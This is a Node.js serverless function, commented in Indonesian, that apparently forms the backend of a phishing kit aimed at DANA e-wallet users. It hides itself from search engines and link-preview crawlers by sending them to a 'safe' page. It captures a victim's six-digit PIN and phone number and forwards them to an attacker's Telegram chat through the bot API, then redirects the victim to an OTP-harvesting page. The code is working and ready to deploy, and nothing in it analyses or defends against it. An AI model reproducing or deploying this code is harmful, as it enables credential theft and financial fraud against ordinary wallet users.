// Serverless function untuk menggantikan pin.php
const fetch = require("node-fetch");
const cookie = require("cookie");

// Daftar pola User-Agent bot yang umum
const botPatterns = [
  /bot/i, /spider/i, /crawler/i, /slurp/i, /googlebot/i, /bingbot/i, /yandexbot/i, /duckduckbot/i, /baiduspider/i, /facebookexternalhit/i, /twitterbot/i, /linkedinbot/i, /embedly/i, /quora link preview/i, /showyoubot/i, /outbrain/i, /pinterest/i, /developers.google.com/i, /adsbot-google/i, /mediapartners-google/i, /feedfetcher-google/i, /applebot/i, /petalbot/i, /ahrefsbot/i, /semrushbot/i, /mj12bot/i, /dotbot/i, /bytespider/i
];

// Pola User-Agent TelegramBot
const telegramBotPattern = /TelegramBot/i;

exports.handler = async (event, context) => {
  // --- Bot Detection Start ---
  const userAgent = event.headers["user-agent"] || "";
  const isTelegramBot = telegramBotPattern.test(userAgent);
  const isOtherBot = botPatterns.some(pattern => pattern.test(userAgent));

  // Redirect semua bot kecuali TelegramBot ke halaman aman
  if (isOtherBot && !isTelegramBot) {
    console.log(`Bot detected (and not TelegramBot): ${userAgent}. Redirecting to safe page.`);
    return {
      statusCode: 200,
      body: JSON.stringify({ 
        success: true,
        message: "Redirecting to safe page",
        redirect: "/safe.html"
      })
    };
  } else if (isTelegramBot) {
    console.log(`TelegramBot detected: ${userAgent}. Allowing request.`);
  }
  // --- Bot Detection End ---

  // Hanya menerima metode POST
  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      body: JSON.stringify({ message: "Method Not Allowed" })
    };
  }

  try {
    // Parse body dari request
    const data = JSON.parse(event.body);
    const pin1 = data.pin1;
    const pin2 = data.pin2;
    const pin3 = data.pin3;
    const pin4 = data.pin4;
    const pin5 = data.pin5;
    const pin6 = data.pin6;
    
    // Validasi input
    if (!pin1 || !pin2 || !pin3 || !pin4 || !pin5 || !pin6) {
      return {
        statusCode: 400,
        body: JSON.stringify({ message: "PIN tidak lengkap" })
      };
    }

    const pin = pin1 + pin2 + pin3 + pin4 + pin5 + pin6;
    
    // Ambil nomor HP dari cookie
    let nohp = "";
    if (event.headers.cookie) {
      const cookies = cookie.parse(event.headers.cookie);
      nohp = cookies.nohp || "";
    }
    
    // Ambil API key dan chat ID dari environment variables
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    
    // Validasi environment variables
    if (!botToken || !chatId) {
      console.error("Environment variables TELEGRAM_BOT_TOKEN atau TELEGRAM_CHAT_ID tidak ditemukan");
      return {
        statusCode: 500,
        body: JSON.stringify({ message: "Konfigurasi server tidak lengkap" })
      };
    }

    // Format pesan untuk Telegram
    const message = `
╔═════ஜ۩۞۩ஜ═════╗
  Notif.Dana.masok.bossqu

• No HP     : ${nohp}
• Pin       : ${pin}
`;

    // Kirim pesan ke Telegram
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const telegramResponse = await fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown"
      })
    });

    const telegramData = await telegramResponse.json();
    
    // Simpan PIN di cookie untuk digunakan di langkah berikutnya
    // Catatan: Di Netlify, kita tidak bisa menggunakan session PHP
    // Kita menggunakan cookie sebagai alternatif
    
    return {
      statusCode: 200,
      headers: {
        "Set-Cookie": `pin=${pin}; Path=/; SameSite=Strict; HttpOnly; Max-Age=3600`,
      },
      body: JSON.stringify({ 
        success: true,
        message: "Data berhasil dikirim",
        redirect: "/otp.html"
      })
    };
  } catch (error) {
    console.error("Error:", error);
    return {
      statusCode: 500,
      body: JSON.stringify({ message: "Terjadi kesalahan pada server" })
    };
  }
};